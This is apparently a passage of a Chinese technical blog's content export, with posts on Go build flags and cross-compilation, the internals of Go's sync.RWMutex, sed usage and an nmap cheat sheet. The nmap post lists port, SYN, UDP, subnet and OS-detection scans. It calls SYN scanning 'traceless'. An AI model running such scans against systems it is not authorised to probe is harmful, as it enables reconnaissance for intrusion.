class="type">string</span></span><br><span class="line">    buildTime <span class="type">string</span></span><br><span class="line">    goVersion <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    args := os.Args</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">2</span> &amp;&amp; (args[<span class="number">1</span>] == <span class="string">"--version"</span> || args[<span class="number">1</span>] == <span class="string">"-v"</span>) {</span><br><span class="line">        fmt.Printf(<span class="string">"Git Commit Hash: %s \n"</span>, gitHash)</span><br><span class="line">        fmt.Printf(<span class="string">"Build TimeStamp: %s \n"</span>, buildTime)</span><br><span class="line">        fmt.Printf(<span class="string">"GoLang Version: %s \n"</span>, goVersion)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -ldflags <span class="string">"-X 'main.goVersion=<span class="subst">$(go version)</span>' -X 'main.gitHash=<span class="subst">$(git show -s --format=%H)</span>' -X 'main.buildTime=<span class="subst">$(git show -s --format=%cd)</span>'"</span> -o main</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  cmd git:(master) ✗ ./main -v                                                                                                                                                 </span><br><span class="line">Git Commit Hash: 24ba11ec5e2af192dc619e2555c6604a254690d0 </span><br><span class="line">Build TimeStamp: Mon Mar 11 15:44:52 2024 +0800 </span><br><span class="line">GoLang Version: go version go1.20.6 darwin/amd64 </span><br></pre></td></tr></tbody></table></figure><p>makefile</p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flags=-X main.buildDate=`date -u '+%Y-%m-%d'` -X main.gitHash=`git rev-parse --short HEAD`</span><br><span class="line"></span><br><span class="line"><span class="section">build:</span></span><br><span class="line">    go build -ldflags <span class="string">"<span class="variable">$(flags)</span>"</span> -o main main.go</span><br></pre></td></tr></tbody></table></figure></li><li><p>-mod</p><ul><li>readonly,vendor,mod 1.14版本以后，如果在mod文件里面有指定vendor，则默认使用vendor，否则设置为readonly</li></ul></li><li><p>-race</p><ul><li>同时检测数据竞争状态，只支持 linux/amd64, freebsd/amd64, darwin/amd64 和 windows/amd64</li></ul></li></ul><h3 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h3><p>编译跨平台的只需要修改<code>GOOS</code>、<code>GOARCH</code>、<code>CGO_ENABLED</code>三个环境变量即可</p><ul><li>GOOS：目标平台的操作系统（darwin，freebsd，linux，windows）</li><li>GOARCH：目标平台的体系架构32位还是64位（386，amd64，arm）</li><li>交叉编译不支持CGO所以要禁用它</li></ul><p>Windows环境编译</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line"></span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br></pre></td></tr></tbody></table></figure><p>Mac环境编译</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br></pre></td></tr></tbody></table></figure><p>Linux环境编译</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-端口扫描工具nmap</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2023-12-22-%E7%BD%91%E7%BB%9C-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7nmap/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2023-12-22-%E7%BD%91%E7%BB%9C-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="NMap"><a href="#NMap" class="headerlink" title="NMap"></a>NMap</h2><p>Network Mapper，是一款网络扫描和主机检测的非常有用的工具。</p><p>其基本功能有三个：</p><ul><li>是扫描主机端口，嗅探所提供的网络服务</li><li>是探测一组主机是否在线</li><li>还可以推断主机所用的操作系统，到达主机经过的路由，系统已开放端口的软件版本</li></ul><h4 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h4><blockquote><p>// ping扫描</p><p>nmap -sP 10.22.133.11</p></blockquote><h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><blockquote><p>// 指定端口范围使用-p参数</p><p>nmap 192.169.0.1 -p1-65535</p><p>// 如果不指定要扫描的端口，Nmap默认扫描从1到1024再加上nmap-services列出的端口</p><p>nmap 192.169.0.1</p><p>// sys扫描（速度快，不会留下痕迹,没有完成三次捂手）</p><p>nmap -sS 192.168.0.10</p><p>// Connect扫描跟sys很像，完成了三次捂手</p><p>nmap -sT 192.168.0.10</p><p>// 扫描主机并跟踪路由</p><p>nmap –traceroute <a href="http://www.linux265.com/">www.linux265.com</a></p></blockquote><h4 id="一个IP的多个端口"><a href="#一个IP的多个端口" class="headerlink" title="一个IP的多个端口"></a>一个IP的多个端口</h4><blockquote><p>nmap 10.0.1.161  -p20-200,7777,8888</p></blockquote><h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><p>-sU：表示udp scan ， udp端口扫描</p><p>-Pn：不对目标进行ping探测（不判断主机是否在线）（直接扫描端口）</p><p>对于udp端口扫描比较慢，扫描完6万多个端口需要20分钟左右</p><blockquote><p>nmap -sU 10.0.1.161 -Pn</p></blockquote><h4 id="多个IP"><a href="#多个IP" class="headerlink" title="多个IP"></a>多个IP</h4><blockquote><p>nmap 10.0.1.161 10.0.1.162</p><p>nmap 10.0.1.161,162</p><p>nmap 10.0.1.161-162</p><p>// 子网网段</p><p>nmap 10.0.3.0/24</p></blockquote><h4 id="扫描文件里的IP"><a href="#扫描文件里的IP" class="headerlink" title="扫描文件里的IP"></a>扫描文件里的IP</h4><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@B ~]<span class="comment"># cat ip.txt</span></span><br><span class="line">10.0.1.161</span><br><span class="line">10.0.1.162</span><br></pre></td></tr></tbody></table></figure><blockquote><p>nmap -iL ip.txt</p></blockquote><h4 id="排除某IP"><a href="#排除某IP" class="headerlink" title="排除某IP"></a>排除某IP</h4><blockquote><p>nmap 10.0.1.161-162 –exclude 10.0.1.162</p><p>nmap 10.0.1.161-163 –exclude 10.0.1.162-163</p><p>nmap 10.0.1.161-163 –exclude 10.0.1.161,10.0.1.163</p><p>nmap 10.0.1.161-163 –excludefile ex.txt</p></blockquote><h4 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h4><blockquote><p>nmap -O 192.168.1.100</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-RWMutex</title>
      <link href="/Code/Code-Golang-RWMutex/"/>
      <url>/Code/Code-Golang-RWMutex/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="sync-RWMutex"><a href="#sync-RWMutex" class="headerlink" title="sync.RWMutex"></a>sync.RWMutex</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote><p>读写互斥锁，可以由多个读者或单个写者持有。RWMutex的零值是未锁定的互斥锁。</p></blockquote><ol><li><p>结构体及其常量</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> RWMutex <span class="keyword">struct</span> {</span><br><span class="line">w           Mutex  <span class="comment">// 互斥锁</span></span><br><span class="line">writerSem   <span class="type">uint32</span> <span class="comment">// 写操作等待读操作完成的信号量</span></span><br><span class="line">readerSem   <span class="type">uint32</span> <span class="comment">// 读操作等待写操作完成的信号量</span></span><br><span class="line">readerCount <span class="type">int32</span>  <span class="comment">// 读锁计数器</span></span><br><span class="line">readerWait  <span class="type">int32</span>  <span class="comment">// 获取写锁时当前需要等待的读锁释放数量</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最大只支持 1 &lt;&lt; 30 个读锁</span></span><br><span class="line"><span class="keyword">const</span> rwmutexMaxReaders = <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>四种方法</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> Lock         <span class="comment">// 提供写锁加锁操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> RLock        <span class="comment">// 提供读锁加锁操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> RUnlock      <span class="comment">// 提供读锁解锁操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> Unlock       <span class="comment">// 提供写锁解锁操作</span></span><br></pre></td></tr></tbody></table></figure><p>读操作可并发重入，写操作是互斥的，读写锁通常用互斥锁、条件变量、信号量实现。</p></li></ol><h3 id="场景-实现"><a href="#场景-实现" class="headerlink" title="场景&amp;实现"></a>场景&amp;实现</h3><ol><li><p>写操作互斥写操作</p><p>读写锁包含一个互斥锁，写锁定必须先获取该互斥锁，如果互斥锁已被协程A获取（或者协程A在阻塞等待读结束），意味着协程A获取了互斥锁，那么协程B只能阻塞等待该互斥锁。</p></li><li><p>写操作互斥读操作</p><p>通过RWMutex.readerCount表示读者数量，不考虑写操作的情况下，每次读写锁将该值+1，每次解除读锁定将该值-1，所以readerCount取值为[0,N]，N为读者个数，实际上最大可支持2^30个并发读者。</p><p>写操作将readerCount变成负数来阻止读操作，当写锁定时将readerCount减去2^30，从而readerCount变成负值，此时再有读锁定检测到readerCount为负值，则开始阻塞等待。真实的读操作个数并不会丢失，只需要将readerCount加上2^30即可。</p></li><li><p>读操作互斥写操作</p><p>读锁定会先将readerCount加1，此时写操作来是发现读者数量不为0，会阻塞等待所有读操作结束。</p></li><li><p>写锁定不会被饿死</p><p>写操作要等待读操作结束后才可以获得锁，写操作等待期间可能还有新的读操作持续到来，如果写操作等待所有读操作结束，很可能被饿死。</p><p>通过RWMutex.readerWait解决，在写操作到来是，会把RWMutex.readerCount值拷贝到RWMutex.readerWait中，用于标记排在写操作前面的读者个数。前面的读操作结束后，除了会递减readerCount，还会递减readerWait值，当readerWait值变为0时唤醒写操作。写操作相当于把一段连续的读划分为两部分，前面的读操作结束后唤醒写操作，写操作结束后唤醒后面的读操作。</p></li></ol><h3 id="源码实现"><a href="#源码实现" class="headerlink" title="源码实现"></a>源码实现</h3><ol><li><p>写锁加锁 Lock()</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> Lock() {</span><br><span class="line">    <span class="comment">// 竞态检测</span></span><br><span class="line">    <span class="keyword">if</span> race.Enabled {</span><br><span class="line">        _ = rw.w.state</span><br><span class="line">        race.Disable()</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 1.使用 Mutex 锁，解决与其他写者的竞争</span></span><br><span class="line">    rw.w.Lock()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2.判断当前是否存在读锁：先通过原子操作改变readerCount（readerCount-rwmutexMaxReaders），</span></span><br><span class="line">    <span class="comment">// 使其变为负数，告诉 RUnLock 当前存在写锁等待；</span></span><br><span class="line">    <span class="comment">// 然后再加回 rwmutexMaxReaders 并赋给r，若r仍然不为0, 代表当前还有读锁</span></span><br><span class="line">    r := atomic.AddInt32(&amp;rw.readerCount, -rwmutexMaxReaders) + rwmutexMaxReaders</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3.如果仍然有其他 Goroutine 持有互斥锁的读锁（r != 0）</span></span><br><span class="line">    <span class="comment">// 会先将 readerCount 的值加到 readerWait中，防止源源不断的读者进来导致写锁饿死，</span></span><br><span class="line">    <span class="comment">// 然后该 Goroutine 会调用 sync.runtime_SemacquireMutex 进入休眠状态，</span></span><br><span class="line">    <span class="comment">// 并等待所有读锁所有者执行结束后释放 writerSem 信号量将当前协程唤醒。</span></span><br><span class="line">    <span class="keyword">if</span> r != <span class="number">0</span> &amp;&amp; atomic.AddInt32(&amp;rw.readerWait, r) != <span class="number">0</span> {</span><br><span class="line">        <span class="comment">// 阻塞写锁</span></span><br><span class="line">        runtime_SemacquireMutex(&amp;rw.writerSem, <span class="literal">false</span>, <span class="number">0</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 竞态检测</span></span><br><span class="line">    <span class="keyword">if</span> race.Enabled {</span><br><span class="line">        race.Enable()</span><br><span class="line">        race.Acquire(unsafe.Pointer(&amp;rw.readerSem))</span><br><span class="line">        race.Acquire(unsafe.Pointer(&amp;rw.writerSem))</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li>使用 <code>sync.Mutex</code> 中的互斥锁 <code>sync.Mutex.Lock()</code> 先解决与其他写者的竞争问题；</li><li>判断当前是否存在读锁：先通过原子操作改变<code>readerCount（readerCount-rwmutexMaxReaders）</code>，使其变为负数，告诉 RUnLock 当前存在写锁等待，然后再加回<code>rwmutexMaxReaders</code> 并赋给r，若r仍然不为0，代表当前还有读锁</li><li>判断是否还有其他 <code>Goroutine</code> 持有<code>RWMutex</code>互斥锁的读锁（r != 0），如果有则会先将当前的 <code>readerCount</code> 的数量加到 <code>readerWait</code>中，从而防止后面源源不断的读者请求读锁，从而进来导致写锁饿死的情况发生，然后该 <code>Goroutine</code> 会调用 <code>sync.runtime_SemacquireMutex</code> 进入休眠状态，并等待当前持有读锁的 <code>Goroutine</code> 结束后释放 <code>writerSem</code> 信号量将当前 <code>Goroutine</code> 唤醒。</li></ol></li><li><p>写锁释放 UnLock()</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> Unlock() {</span><br><span class="line">    <span class="comment">// 竞态检测</span></span><br><span class="line"><span class="keyword">if</span> race.Enabled {</span><br><span class="line">_ = rw.w.state</span><br><span class="line">race.Release(unsafe.Pointer(&amp;rw.readerSem))</span><br><span class="line">race.Disable()</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 1.释放读锁：通过调用 atomic.AddInt32 函数将 readerCount 加上 rwmutexMaxReaders 从而变回正数；；</span></span><br><span class="line">r := atomic.AddInt32(&amp;rw.readerCount, rwmutexMaxReaders)</span><br><span class="line">    <span class="comment">// 若超过读锁的最大限制, 触发panic</span></span><br><span class="line"><span class="keyword">if</span> r &gt;= rwmutexMaxReaders {</span><br><span class="line">race.Enable()</span><br><span class="line">throw(<span class="string">"sync: Unlock of unlocked RWMutex"</span>)</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 2.通过 for 循环触发所有由于获取读锁而陷入等待的 Goroutine，也即解除阻塞的读锁(若有)</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="type">int</span>(r); i++ {</span><br><span class="line">runtime_Semrelease(&amp;rw.readerSem, <span class="literal">false</span>, <span class="number">0</span>)</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 3.调用 sync.Mutex.Unlock 方法释放写互斥锁</span></span><br><span class="line">rw.w.Unlock()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 是否开启竞态检测</span></span><br><span class="line"><span class="keyword">if</span> race.Enabled {</span><br><span class="line">race.Enable()</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li>释放读锁：通过调用 <code>atomic.AddInt32</code> 函数将 <code>readerCount</code> 加上 <code>rwmutexMaxReaders</code> 从而变回正数；</li><li>通过 for 循环触发所有由于获取读锁而陷入等待的 Goroutine，也即解除阻塞的读锁(若有)；</li><li>调用 <code>sync.Mutex.Unlock()</code> 方法释放写互斥锁。</li></ol></li><li><p>读锁加锁 RLock()</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> RLock() {</span><br><span class="line">    <span class="comment">// 是否开启检测race</span></span><br><span class="line">    <span class="keyword">if</span> race.Enabled {</span><br><span class="line">        _ = rw.w.state</span><br><span class="line">        race.Disable()</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//这里分两种情况:</span></span><br><span class="line"><span class="comment">// 1.此时无写锁 (readerCount + 1) &gt; 0,那么可以上读锁, 并且readerCount原子加1(读锁可重入[只要匹配了释放次数就行])</span></span><br><span class="line"><span class="comment">// 2.此时有写锁 (readerCount + 1) &lt; 0,所以通过readerSem读信号量, 使读操作睡眠等待</span></span><br><span class="line">    <span class="keyword">if</span> atomic.AddInt32(&amp;rw.readerCount, <span class="number">1</span>) &lt; <span class="number">0</span> {</span><br><span class="line">        <span class="comment">// 当前有个写锁, 读操作需要阻塞等待写锁释放；</span></span><br><span class="line">        <span class="comment">// 其实做的事情是将 goroutine 排到G队列的后面,挂起 goroutine</span></span><br><span class="line">        runtime_SemacquireMutex(&amp;rw.readerSem, <span class="literal">false</span>, <span class="number">0</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 是否开启检测race</span></span><br><span class="line">    <span class="keyword">if</span> race.Enabled {</span><br><span class="line">        race.Enable()</span><br><span class="line">        race.Acquire(unsafe.Pointer(&amp;rw.readerSem))</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li>此时无写锁 <code>(readerCount + 1) &gt; 0</code>（注意，在写锁是加锁那里，我们对readerCount 进行了<code>readerCount-rwmutexMaxReaders</code>处理），那么可以上读锁, 并且<code>readerCount</code>原子加1（读锁可重入[只要匹配了释放次数就行]）；</li><li>此时有写锁 <code>(readerCount + 1) &lt; 0,</code>所以通过<code>readerSem</code>读信号量, 使读操作睡眠等待；</li></ol></li><li><p>读锁释放 RUnlock()</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> RUnlock() {</span><br><span class="line">    <span class="comment">// 竞态检测</span></span><br><span class="line">    <span class="keyword">if</span> race.Enabled {</span><br><span class="line">        _ = rw.w.state</span><br><span class="line">        race.ReleaseMerge(unsafe.Pointer(&amp;rw.writerSem))</span><br><span class="line">        race.Disable()</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 写锁等待状态，检查当前是否可以进行获取；</span></span><br><span class="line">    <span class="comment">// 首先将 readerCount 减1并赋予r，然后分两种情况判断</span></span><br><span class="line">    <span class="comment">//  1.若r大于等于0，读锁直接解锁成功，直接结束本次操作；</span></span><br><span class="line">    <span class="comment">//  2.若r小于0，有一个正在执行的写操作，在这时会调用sync.RWMutex.rUnlockSlow 方法；</span></span><br><span class="line">    <span class="keyword">if</span> r := atomic.AddInt32(&amp;rw.readerCount, <span class="number">-1</span>); r &lt; <span class="number">0</span> {</span><br><span class="line">        <span class="comment">// Outlined slow-path to allow the fast-path to be inlined</span></span><br><span class="line">        rw.rUnlockSlow(r)</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> race.Enabled {</span><br><span class="line">        race.Enable()</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rw *RWMutex)</span></span> rUnlockSlow(r <span class="type">int32</span>) {</span><br><span class="line">    <span class="comment">// r + 1 == 0 表示本来就没读锁, 直接执行RUnlock()</span></span><br><span class="line">    <span class="comment">// r + 1 == -rwmutexMaxReaders 表示执行Lock()再执行RUnlock()</span></span><br><span class="line"><span class="keyword">if</span> r+<span class="number">1</span> == <span class="number">0</span> || r+<span class="number">1</span> == -rwmutexMaxReaders {</span><br><span class="line">race.Enable()</span><br><span class="line">throw(<span class="string">"sync: RUnlock of unlocked RWMutex"</span>)</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 如果当前有写锁等待，则减少一个readerWait的数目</span></span><br><span class="line">    <span class="keyword">if</span> atomic.AddInt32(&amp;rw.readerWait, <span class="number">-1</span>) == <span class="number">0</span> {</span><br><span class="line"><span class="comment">// 写锁前的最后一个读锁唤醒写锁执行</span></span><br><span class="line">        runtime_Semrelease(&amp;rw.writerSem, <span class="literal">false</span>, <span class="number">1</span>)</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li><p>首先readerCount 减1，然后进行两种情况的判断：</p><ol><li>若 r 大于等于0，读锁直接解锁成功，直接结束本次操作；</li><li>若 r 小于0， 有一个正在执行的写操作，在这时会调用<code>sync.RWMutex.rUnlockSlow</code> 方法；</li></ol></li><li><p>然后倘若上面判断 r 小于0，则进入 <code>rUnlockSlow()</code> 慢解锁，先进行一个判断，若有以下两种情况发生：<code>r + 1 == 0</code>表示直接执行<code>RUnlock()</code> ，<code>r + 1 == -rwmutexMaxReaders</code>表示执行 <code>Lock()</code> 再执行 <code>RUnlock()</code>，这两种情况都会进行报错。</p></li><li><p>如果没有上述两种情况发生，则<code>sync.RWMutex.rUnlockSlow</code> 会减少获取锁的写操作等待的读操作数 <code>readerWait</code> ，并在所有读操作都被释放之后触发写操作的信号量 <code>writerSem</code>，该信号量被触发时，调度器就会唤醒尝试获取写锁的 <code>Goroutine</code>。</p></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令 - sed</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-18-Linux-sed%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-04-18-Linux-sed%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="sed是什么"><a href="#sed是什么" class="headerlink" title="sed是什么"></a>sed是什么</h2><p>sed是stream editor的简称，也就是流编辑器。它一次处理一行内容，处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，不断重复，直到文件末尾。文件内容不会改变，除非使用重定向输出。</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [option] <span class="string">'command'</span> filename</span><br></pre></td></tr></tbody></table></figure><p>常用option：</p><blockquote><p>-n 或–quiet或–silent 仅显示script处理后的结果.</p><p>-e ‘脚本’或–expression=脚本 以选项中指定的script来处理输入的文本文件。</p><p>-f &lt;script文件&gt;或–file=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。</p><p>-r 让sed命令支持扩展的正则表达式(默认是基础正则表达式)。</p></blockquote><p>动作说明：</p><blockquote><p>a: 新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)。</p><p>c: 取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行。</p><p>d: 删除</p><p>i: 插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)。</p><p>p: 打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行</p><p>s: 取代，可以直接进行取代的工作。通常这个 s 的动作可以搭配正则表达式</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><p>插入</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在第一行前添加字符串</span></span><br><span class="line">sed <span class="string">'1i\添加的内容'</span> file</span><br><span class="line"><span class="comment"># 在最后一行行前添加字符串</span></span><br><span class="line">sed <span class="string">'$i\添加的内容'</span> file</span><br><span class="line"><span class="comment"># 在最后一行行后添加字符串</span></span><br><span class="line">sed <span class="string">'$a\添加的内容'</span> file</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>替换</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注释掉含有“swap”的行</span></span><br><span class="line">sed -i <span class="string">'s/^[^#].*swap*/#&amp;/g'</span> fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消含有字符串swap的行最前面的注释符号#</span></span><br><span class="line"><span class="comment">## //两杠表示空格，以空格替换#，等价取消#。</span></span><br><span class="line">sed -i <span class="string">'/^#.*swap/s/^#//g'</span> fstab</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>删除</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 